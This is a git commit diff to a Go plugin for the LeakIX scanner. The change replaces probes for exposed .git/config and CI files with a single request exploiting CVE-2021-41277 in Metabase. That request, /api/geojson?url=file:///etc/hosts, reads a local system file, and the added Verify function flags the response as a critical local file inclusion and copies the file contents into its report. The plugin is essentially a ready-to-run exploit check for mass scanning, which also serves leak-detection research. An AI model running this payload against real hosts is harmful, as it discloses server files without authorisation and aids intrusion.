208b3b2323e4624f5c9642a17e8d74922d5770f6
judicieux <r4nd0mmachine@gmail.com>
2024-11-04 20:02:55 +0100

    Update ExaPathsPlugin.go

--- ExaPathsPlugin.go
+++ ExaPathsPlugin.go
@@ -1,50 +1,54 @@
 package path_exposure
 
 import (
-        "github.com/LeakIX/l9format"
-        "strings"
+	"github.com/LeakIX/l9format"
+	"strings"
 )
 
 type ExaPathsPlugin struct {
-        l9format.ServicePluginBase
+	l9format.ServicePluginBase
 }
 
 func (ExaPathsPlugin) GetVersion() (int, int, int) {
-        return 0, 0, 1
+	return 0, 0, 1
 }
 
 func (ExaPathsPlugin) GetRequests() []l9format.WebPluginRequest {
-        // Ajoutez ici les chemins spécifiques que vous souhaitez vérifier
-        return []l9format.WebPluginRequest{
-                {Method: "GET", Path: "/content../.git/config"},
-                {Method: "GET", Path: "/images../.git/config"},
-                {Method: "GET", Path: "/js../.git/config"},
-                {Method: "GET", Path: "/media../.git/config"},
-                {Method: "GET", Path: "/static../.git/config"},
-                {Method: "GET", Path: "/.github/workflows/build.yaml"},
-                {Method: "GET", Path: "/.github/workflows/build.yml"},
-                {Method: "GET", Path: "/.gitlab-ci.yml"},
-        }
+	return []l9format.WebPluginRequest{{
+		Method:  "GET",
+		Path:    "/api/geojson?url=file:///etc/hosts",
+		Headers: map[string]string{},
+		Body:    []byte(""),
+	}}
 }
 
 func (ExaPathsPlugin) GetName() string {
-        return "ExaPathsPlugin"
+	return "ExaPathsPlugin"
 }
 
 func (ExaPathsPlugin) GetStage() string {
-        return "open"
+	return "open"
 }
+func (plugin ExaPathsPlugin) Verify(request l9format.WebPluginRequest, response l9format.WebPluginResponse, event *l9format.L9Event, options map[string]string) (hasLeak bool) {
+	// if not checking for request , or not 200 or html, quit
+	if !request.EqualAny(plugin.GetRequests()) || response.Response.StatusCode != 200 {
+		return false
+	}
+	lowerBody := strings.ToLower(string(response.Body))
+	if len(lowerBody) < 10 {
+		return false
+	}
+	if strings.Contains(lowerBody, "<html") {
+		return false
+	}
+	if !strings.Contains(lowerBody, "localhost") && !strings.Contains(lowerBody, "127") {
+		return false
+	}
+	event.Service.Software.Name = "Metabase"
+	event.Leak.Type = "lfi"
+	event.Leak.Severity = "critical"
+	event.AddTag("cve-2021-41277")
+	event.Summary = "Found /etc/hosts through CVE-2021-41277:\n" + string(response.Body)
+	return true
 
-func (plugin ExaPathsPlugin) Verify(request l9format.WebPluginRequest, response l9format.WebPluginResponse, event *l9format.L9Event, options map[string]string) bool {
-        if response.Response.StatusCode != 200 {
-                return false
-        }
-        if strings.Contains(strings.ToLower(string(response.Body)), "repositoryformatversion") {
-                event.Service.Software.Name = "Git Repository"
-                event.Leak.Type = "path_exposure"
-                event.Leak.Severity = "high"
-                event.Summary = "Found exposed git configuration file"
-                return true
-        }
-        return false
 }
